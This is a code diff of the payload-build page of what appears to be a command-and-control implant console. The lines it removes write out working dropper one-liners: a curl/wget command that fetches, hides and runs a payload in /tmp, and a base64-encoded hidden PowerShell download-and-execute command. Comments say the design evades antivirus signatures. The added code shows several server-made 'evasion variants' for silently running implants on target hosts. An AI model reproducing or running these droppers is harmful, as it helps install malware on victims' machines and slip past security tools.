@@ -1,6 +1,6 @@
-import { useState, useEffect, useCallback, useMemo } from 'react'
-import { Plus, Download, RefreshCw, Settings, FileCode, Cpu, Server, Loader2, Trash2, Shield, Copy, CheckCircle2, Monitor, HardDrive, Terminal } from 'lucide-react'
-import { builderApi, sessionApi, BuildRequest, BuilderInfo, type RelayNode } from '../api'
+import { useState, useEffect, useCallback } from 'react'
+import { Plus, Download, RefreshCw, Settings, FileCode, Cpu, Server, Loader2, Trash2, Shield, Copy, CheckCircle2, Monitor, HardDrive, Terminal, AlertTriangle } from 'lucide-react'
+import { builderApi, sessionApi, BuildRequest, BuilderInfo, type RelayNode, type OneLinerSet } from '../api'
 import { useToast, ToastContainer } from '../components/Toast'
 import { DownloadProgress } from '../components/DownloadProgress'
 import axios from 'axios'
@@ -26,7 +26,10 @@ export function Builds() {
   const [loading, setLoading] = useState(false)
   const [showModal, setShowModal] = useState(false)
   const [building, setBuilding] = useState(false)
-  const [buildResult, setBuildResult] = useState<{ id: string; name: string; format: string; size: number; serverUrl: string; oneLiner?: string } | null>(null)
+  // 构建结果：一键上线命令由服务端生成（含下载地址解析 + 多条免杀变体），
+  // 前端不再用 window.location.origin 自己拼地址（从 localhost 打开后台时会生成
+  // 目标机无法访问的 localhost 地址）。
+  const [buildResult, setBuildResult] = useState<{ id: string; name: string; format: string; size: number; serverUrl: string; oneLinerSet?: OneLinerSet } | null>(null)
 
   // format -> 下载文件扩展名；未知格式原样返回，避免误转
   const formatToExt = (format: string): string => {
@@ -54,61 +57,51 @@ export function Builds() {
   // 下载进度：按载荷 id 标记当前下载，加载中显示实时进度条
   const [dlProgress, setDlProgress] = useState<{ id: string; percent: number; loaded: number; total: number; done?: boolean } | null>(null)
 
-  // 一条命令上线：在目标机执行该命令即可静默下载并运行载荷。
-  // 下载端点 /api/v1/implant/payload/{id} 免认证，URL 直接用当前访问的后台地址。
-  // Windows 用 PowerShell -enc（UTF-16LE Base64）执行，避开 Invoke-WebRequest /
-  // -ep bypass 等明文特征，落地文件名随机化；Linux 用 curl（回退 wget）后台运行。
-  const buildOneLinerFor = (imp: StoredImplant): string => {
+  // 一条命令上线：命令与下载地址全部由服务端生成（见 internal/server/api/oneliner.go），
+  // 这里只判断该载荷是否支持、并展示服务端返回的多个免杀变体。
+  // 仅可直接运行的载荷支持：Windows 为 exe/raw；Linux 为 bin/exe/raw（so 是动态库）。
+  const supportsOneLiner = (imp: StoredImplant): boolean => {
     const osName = (imp.os || 'windows').toLowerCase()
-    // 仅可直接运行的载荷支持一条命令上线：
-    // Windows 为 exe/raw；Linux 为 bin/exe/raw（so 是动态库，不能直接执行）
-    if (osName === 'linux') {
-      if (imp.format !== 'exe' && imp.format !== 'raw' && imp.format !== 'bin') return ''
-    } else if (osName === 'windows') {
-      if (imp.format !== 'exe' && imp.format !== 'raw') return ''
-    } else {
-      return ''
-    }
-    const origin = window.location.origin
-    const dl = `${origin}/api/v1/implant/payload/${imp.id}`
-    if (osName === 'linux') {
-      const tmp = `/tmp/.${randName(4)}`
-      return `curl -fsSL '${dl}' -o ${tmp} 2>/dev/null || wget -qO ${tmp} '${dl}'; chmod +x ${tmp}; nohup ${tmp} >/dev/null 2>&1 &`
-    }
-    const tmp = `${randName(4)}.exe`
-    const ps = `$p="$env:TEMP\\${tmp}";$w=New-Object Net.WebClient;$w.DownloadFile('${dl}',$p);Start-Process $p -WindowStyle Hidden`
-    return `powershell -w hidden -nop -enc ${utf16leB64(ps)}`
+    if (osName === 'linux') return imp.format === 'exe' || imp.format === 'raw' || imp.format === 'bin'
+    if (osName === 'windows') return imp.format === 'exe' || imp.format === 'raw'
+    return false
   }
 
-  // UTF-16LE Base64 编码，供 powershell -enc 使用，使下载 URL / 落地文件名在命令行中不可见
-  const utf16leB64 = (s: string): string => {
-    let bin = ''
-    for (let i = 0; i < s.length; i++) {
-      const c = s.charCodeAt(i)
-      bin += String.fromCharCode(c & 0xff, (c >> 8) & 0xff)
+  // 列表弹窗内的一键上线命令：打开弹窗时按载荷 ID 向服务端索取（服务端会重新
+  // 解析目标机可达地址，避免地址过期或写成回环地址）。
+  const [oneLinerSet, setOneLinerSet] = useState<OneLinerSet | null>(null)
+  const [oneLinerLoading, setOneLinerLoading] = useState(false)
+
+  useEffect(() => {
+    if (!showOneLinerImp) {
+      setOneLinerSet(null)
+      return
     }
-    return btoa(bin)
-  }
+    let cancelled = false
+    setOneLinerLoading(true)
+    setOneLinerSet(null)
+    api
+      .get<OneLinerSet>(`/implants/stored/${showOneLinerImp.id}/oneliner`)
+      .then((res) => {
+        if (!cancelled) setOneLinerSet(res.data)
+      })
+      .catch((err) => {
+        console.error('Failed to load one-liner:', err)
+        if (!cancelled) setOneLinerSet({ host: '', base_url: '', variants: [], error: '命令生成失败，请重试' })
+      })
+      .finally(() => {
+        if (!cancelled) setOneLinerLoading(false)
+      })
+    return () => {
+      cancelled = true
+    }
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [showOneLinerImp])
 
-  // 生成 n 位小写字母数字随机串，随机化载荷落地文件名，避免固定文件名被静态特征匹配
-  const randName = (n: number): string => {
-    const letters = 'abcdefghijklmnopqrstuvwxyz0123456789'
-    let s = ''
-    for (let i = 0; i < n; i++) s += letters[Math.floor(Math.random() * letters.length)]
-    return s
-  }
-
-  // 弹窗内展示的命令：仅在打开弹窗时生成一次，避免随机落地文件名每次渲染变化
-  const oneLinerCmd = useMemo(
-    () => (showOneLinerImp ? buildOneLinerFor(showOneLinerImp) : ''),
-    [showOneLinerImp],
-  )
-  // 弹窗系统文案
   const oneLinerOs = showOneLinerImp
     ? (showOneLinerImp.os || 'windows').toLowerCase()
     : 'windows'
   const oneLinerOsLabel = oneLinerOs === 'linux' ? 'Linux' : 'Windows'
-  const oneLinerTitle = oneLinerOs === 'linux' ? 'Shell 命令' : 'PowerShell 命令'
 
   // 复制文本到剪贴板：优先使用 Clipboard API，HTTP 非 localhost 环境
   // 不可用时降级为 execCommand，避免点击按钮无任何反应
@@ -386,7 +379,15 @@ export function Builds() {
         format: response.data.format,
         size: response.data.size,
         serverUrl: formData.server_url,
-        oneLiner: response.data.one_liner || '',
+        // 一键上线命令与地址解析结果全部取自服务端响应
+        oneLinerSet: response.data.one_liners?.length
+          ? {
+              host: response.data.one_liner_host || '',
+              base_url: response.data.one_liner_base || '',
+              warning: response.data.one_liner_warning,
+              variants: response.data.one_liners,
+            }
+          : undefined,
       }
       setBuildResult(result)
       
@@ -556,21 +557,22 @@ export function Builds() {
                 <div className="result-item"><span className="result-label">大小</span><span className="result-value">{(buildResult.size / 1024).toFixed(2)} KB</span></div>
                 <div className="result-item server-url"><span className="result-label">服务器地址</span><span className="result-value">{buildResult.serverUrl}</span></div>
               </div>
-              {buildResult.oneLiner && (
-                <div className="oneliner-box">
-                  <div className="oneliner-header">
-                    <span style={{ display: 'inline-flex', alignItems: 'center', gap: 6, fontWeight: 600 }}>
-                      <Terminal size={14} /> 一条命令上线
-                    </span>
-                    <button className="oneliner-copy-btn" onClick={() => copyCommand(buildResult.oneLiner!)} title="复制命令">
-                      {copiedCmd === buildResult.oneLiner ? <CheckCircle2 size={14} /> : <Copy size={14} />}
-                      {copiedCmd === buildResult.oneLiner ? '已复制' : '复制'}
-                    </button>
+              {buildResult.oneLinerSet?.variants?.length ? (
+                <div className="oneliner-section">
+                  <div className="oneliner-section-title">
+                    <Terminal size={14} /> 一条命令上线
+                    <span className="oneliner-tag">{buildResult.oneLinerSet.variants.length} 种方式</span>
                   </div>
-                  <code className="oneliner-code">{buildResult.oneLiner}</code>
-                  <p className="oneliner-hint">在目标 Windows 主机上执行该命令，即可静默下载并运行此载荷（对应所选监听器）</p>
+                  <OneLinerList
+                    set={buildResult.oneLinerSet}
+                    copiedCmd={copiedCmd}
+                    onCopy={copyCommand}
+                  />
+                  <p className="oneliner-hint">
+                    在目标主机上执行任一命令即可静默下载并运行该载荷；下载地址由服务端按目标机可达性解析（不是控制台的访问地址）。
+                  </p>
                 </div>
-              )}
+              ) : null}
               <div className="build-result-actions">
                 <button className="btn btn-primary" onClick={handleDownload}><Download size={16} />下载载荷</button>
                 <button className="btn btn-danger" onClick={handleDelete}><Trash2 size={16} />删除载荷</button>
@@ -626,7 +628,7 @@ export function Builds() {
                   </div>
                   <div className="build-result-actions" style={{ marginTop: 12 }}>
                     <button className="btn btn-primary" onClick={() => handleImplantDownload(imp)}><Download size={16} />下载</button>
-                    {buildOneLinerFor(imp) && (
+                    {supportsOneLiner(imp) && (
                       <button className="btn btn-secondary" onClick={() => setShowOneLinerImp(imp)} title="查看一条命令上线命令">
                         <Terminal size={16} />
                         一条命令上线
@@ -654,22 +656,16 @@ export function Builds() {
             </div>
             <div className="modal-body">
               <p style={{ marginBottom: 12, fontSize: 13, lineHeight: 1.6, color: 'var(--color-text-secondary)' }}>
-                在目标 {oneLinerOsLabel} 主机上执行以下命令，将静默下载并运行「{showOneLinerImp.name}」
+                在目标 {oneLinerOsLabel} 主机上执行以下任一命令，将静默下载并运行「{showOneLinerImp.name}」
                 （对应 {(showOneLinerImp.protocol || 'HTTP').toUpperCase()} 监听器）：
               </p>
-              <div className="oneliner-box">
-                <div className="oneliner-header">
-                  <span style={{ display: 'inline-flex', alignItems: 'center', gap: 6, fontWeight: 600 }}>
-                    <Terminal size={14} /> {oneLinerTitle}
-                  </span>
-                  <button className="oneliner-copy-btn" onClick={() => copyCommand(oneLinerCmd)} title="复制命令">
-                    {copiedCmd === oneLinerCmd ? <CheckCircle2 size={14} /> : <Copy size={14} />}
-                    {copiedCmd === oneLinerCmd ? '已复制' : '复制'}
-                  </button>
-                </div>
-                <code className="oneliner-code">{oneLinerCmd}</code>
-              </div>
-              <p className="oneliner-hint">复制按钮在 http 访问下可能不可用，可直接选中上方命令文本手动复制。</p>
+              <OneLinerList
+                set={oneLinerSet}
+                loading={oneLinerLoading}
+                copiedCmd={copiedCmd}
+                onCopy={copyCommand}
+              />
+              <p className="oneliner-hint">复制按钮在 http 访问下可能不可用，可直接选中命令文本手动复制。</p>
             </div>
             <div className="modal-footer">
               <button className="btn btn-secondary" onClick={() => setShowOneLinerImp(null)}>关闭</button>
@@ -1062,5 +1058,71 @@ export function Builds() {
         </div>
       )}
     </div>
+  )
+}
+
+/**
+ * 一键上线命令列表：命令与下载地址均由服务端生成（internal/server/api/oneliner.go），
+ * 这里只负责展示多个免杀变体、标注推荐项、以及每条的独立复制按钮。
+ */
+function OneLinerList({
+  set,
+  loading,
+  copiedCmd,
+  onCopy,
+}: {
+  set: OneLinerSet | null
+  loading?: boolean
+  copiedCmd: string | null
+  onCopy: (cmd: string) => void
+}) {
+  if (loading) {
+    return (
+      <div className="oneliner-loading">
+        <Loader2 size={14} className="spinning" />
+        <span>正在生成一条命令上线命令…</span>
+      </div>
+    )
+  }
+  if (!set) return null
+  if (set.error || !set.variants?.length) {
+    return <p className="oneliner-hint">{set.error || '暂无可用的上线命令'}</p>
+  }
+
+  return (
+    <>
+      {set.base_url && (
+        <div className="oneliner-meta">
+          <Server size={13} />
+          <span>下载地址</span>
+          <code>{set.base_url}</code>
+        </div>
+      )}
+      {set.warning && (
+        <div className="oneliner-warning">
+          <AlertTriangle size={14} />
+          <span>{set.warning}</span>
+        </div>
+      )}
+      <div className="oneliner-variants">
+        {set.variants.map((v, i) => (
+          <div className="oneliner-box" key={`${v.name}-${i}`}>
+            <div className="oneliner-header">
+              <span style={{ display: 'inline-flex', alignItems: 'center', gap: 6, fontWeight: 600, flexWrap: 'wrap' }}>
+                <Terminal size={14} /> {v.name}
+                {i === 0 && <span className="oneliner-tag oneliner-tag-primary">推荐</span>}
+                <span className="oneliner-tag">{v.shell}</span>
+              </span>
+              <button className="oneliner-copy-btn" onClick={() => onCopy(v.command)} title="复制该命令">
+                {copiedCmd === v.command ? <CheckCircle2 size={14} /> : <Copy size={14} />}
+                {copiedCmd === v.command ? '已复制' : '复制'}
+              </button>
+            </div>
+            <code className="oneliner-code">{v.command}</code>
+            {v.desc && <p className="oneliner-hint">{v.desc}</p>}
+          </div>
+        ))}
+      </div>
+    </>
   )
 }
